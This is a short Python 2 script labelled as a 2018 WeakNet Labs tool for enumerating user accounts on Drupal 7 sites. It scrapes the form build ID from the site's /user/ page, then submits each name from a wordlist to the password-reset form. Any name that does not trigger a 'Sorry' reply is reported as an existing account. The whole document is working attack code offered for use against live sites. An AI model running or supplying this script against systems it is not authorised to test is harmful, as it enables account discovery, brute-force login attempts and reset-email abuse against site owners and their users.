#!/usr/bin/python
import urllib2	# to make HTTP requests
import urllib	# to encode POST data
import sys	# to exit()
import re 	# Regular Expressions
print """

Drupal7 User Enum Script.
2018 WeakNet Labs.

"""
if len(sys.argv) != 3:
 print "Usage: ./drupalUserEnum.py (BASE URL of DRUPAL INSTALLATION) (USERS LIST FILE)"
 sys.exit() # exit

# Arguments:
url=sys.argv[1] # rename for readability
userList=sys.argv[2] # user list

userURL=url+"/user/"
print "[*] Using User URL:",userURL
contents = urllib2.urlopen(userURL) # GET the ./user/ index file for analysis
formId=""
for line in contents:
 if "form_build_id" in line:
  formId=re.sub(r'.*form_build_id..value="([^"]+)".*',r"\1",line)
  print "[*] Found the form ID as:",formId
if formId == "":
 print "[!] No Drupal form ID could be found. Exiting."

# open the user-list file and iterate making HTTP requests
userFileHandle = open(userList,'r')
for user in userFileHandle:
 userFound=1 # true by default
 userStrip=user.strip()
 #print "[*] Trying user",userStrip # DEBUG
 data=urllib.urlencode({'name':user,'form_id':'user_pass','op':'E-mail new password','form_build_id':formId})
 passURL=userURL+"password"
 #print "[*] Using ./user/password URL as:",passURL # DEBUG
 req = urllib2.Request(passURL, data)
 response = urllib2.urlopen(req)
 for line in response:
  if "Sorry" in line:
   userFound=0
   break # leave the response parsing loop
 if userFound==1:
  print "\033[92m[!] Found User:",userStrip,'\033[0m'

userFileHandle.close() # close up the file
sys.exit() # Goodbye.
